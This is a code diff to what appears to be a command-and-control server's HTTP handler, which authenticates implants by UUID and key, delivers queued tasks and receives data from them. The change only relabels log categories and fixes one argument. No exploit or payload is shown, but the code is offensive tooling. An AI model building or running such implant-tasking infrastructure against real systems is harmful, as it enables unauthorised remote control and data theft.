@@ -115,14 +115,14 @@ class HandleRequests(BaseHTTPRequestHandler):
                     f.close()
                 self.wfile.write(data)
                 print(green+"[+]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[200 OK]"+default)  #write to console that it was read
-                writeLog("Web_Request", f"Served file {req} to IP: {IP}", "NULL","NULL")
+                writeLog("Good", f"Served file {req} to IP: {IP}", "NULL","NULL")
         except:
             with open(path+"/web_serve/404.html", 'rb') as f:  #otherwise return a 404
                 data = f.read()
                 f.close()
             self.wfile.write(data)
             print(yellow+"[!]WEB_RESPONSE:::IP="+IP+":::File="+req+":::[400 NOT FOUND]"+default)  #and log the 404 to console
-            writeLog("Web_Request", f"File not found {req} to IP: {IP}", "NULL","NULL")
+            writeLog("Warning", f"File not found {req} to IP: {IP}", "NULL","NULL")
 
     def do_POST(self):
         global should_get
@@ -149,7 +149,7 @@ class HandleRequests(BaseHTTPRequestHandler):
         except:
             IP = self.client_address[0]
             date_time = datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
-            writeLog("Malformed_Request", f"Malformed request from IP: {IP}", "NULL","NULL")
+            writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
             print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
             return 0
 
@@ -170,17 +170,17 @@ class HandleRequests(BaseHTTPRequestHandler):
                         self.wfile.write("write-host Connection Validated".encode("utf-8"))
                         date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                         print(f"{green}{date_time}[+]VALIDATE:::Incomming Validation from {IP}:::Server Connect Success{default}")
-                        writeLog("Server_Validation", f"Server validation success from IP: {IP}", NULL,"NULL")
+                        writeLog("Success", f"Server validation success from IP: {IP}", "NULL","NULL")
                         #connection.close()
                         return 0
                     else:
                         print(f"{red}{date_time}[-]VALIDATE:::Incomming Validation from {IP}:::Invalid Verification Key{default}")
-                        writeLog("Server_Validation", f"Server validation failed from IP: {IP} - Invalid Key", "NULL","NULL")
+                        writeLog("Error", f"Server validation failed from IP: {IP} - Invalid Key", "NULL","NULL")
                         return 0
                 except:
                     date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                     print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
-                    writeLog("Malformed_Request", f"Malformed request from IP: {IP}", "NULL","NULL")
+                    writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                     return 0
             
             try:
@@ -191,7 +191,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                 IP = self.client_address[0]
                 date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                 print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
-                writeLog("Malformed_Request", f"Malformed request from IP: {IP}", "NULL","NULL")
+                writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                 return 0
 
             cursor=connection.cursor()
@@ -202,7 +202,7 @@ class HandleRequests(BaseHTTPRequestHandler):
             if (len(results)<1):  #if it doesn't exist write implant not found and return
                 date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                 print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
-                writeLog("Bad_UUID", f"Request from unknown UUID: {UUID} at IP: {IP}", "name",UUID)
+                writeLog("Error", f"Request from unknown UUID: {UUID} at IP: {IP}", "name",UUID)
                 #connection.close()
                 return 0
             #Check if key matches    
@@ -228,7 +228,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                         num_tasks=len(results)
                         task_word = "Task" if num_tasks == 1 else "Tasks"
                         print(green+date_time+"[+]Incomming Request from " + implant_name + " at IP: " + IP + " :::" + str(num_tasks) + " " + task_word + " delivered"+default)
-                        writeLog("Check_In", f"Check-in from {implant_name} at IP: {IP} - {num_tasks} {task_word} delivered", implant_name,UUID)
+                        writeLog("Success", f"Check-in from {implant_name} at IP: {IP} - {num_tasks} {task_word} delivered", implant_name,UUID)
                         send_task=''
                         
                         for result in results:
@@ -243,7 +243,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                     else: #if no tasks
                         date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                         print(f"{date_time}[-]Incomming Request from {implant_name} at IP: {IP} :::No Tasking Available")
-                        writeLog("Check_In", f"Check-in from {implant_name} at IP: {IP} - No tasks available", implant_name,UUID)
+                        writeLog("Log", f"Check-in from {implant_name} at IP: {IP} - No tasks available", implant_name,UUID)
                         #connection.close()
                         return 0  #end of if for requests
                 elif (request=="send"): #post data to server
@@ -258,13 +258,13 @@ class HandleRequests(BaseHTTPRequestHandler):
                         cursor.execute(query)
                         date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                         print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
-                        writeLog("Data_Received", f"Data received from {implant_name} at IP: {IP}", implant_name,UUID)
+                        writeLog("Data", f"Data received from {implant_name} at IP: {IP}", implant_name,UUID)
                         #connection.close()
                         return 0
                     except:
                         date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                         print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
-                        writeLog("Malformed_Request", f"Malformed request from IP: {IP}", "NULL","NULL")
+                        writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                         #connection.close()
                         return 0
                         
@@ -272,7 +272,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                 else: #request type is bad
                     date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                     print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
-                    writeLog("Malformed_Request", f"Malformed request from IP: {IP}", "NULL","NULL")
+                    writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                     #connection.close()
                     return 0
                     
@@ -280,7 +280,7 @@ class HandleRequests(BaseHTTPRequestHandler):
             else: ###if key doesnt match
                 date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
                 print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
-                writeLog("Bad_Key", f"Request from {implant_name} at IP: {IP} - Invalid Key", implant_name,UUID)
+                writeLog("Error", f"Request from {implant_name} at IP: {IP} - Invalid Key", implant_name,UUID)
                 #connection.close()
                 return 0
     def do_PUT(self):
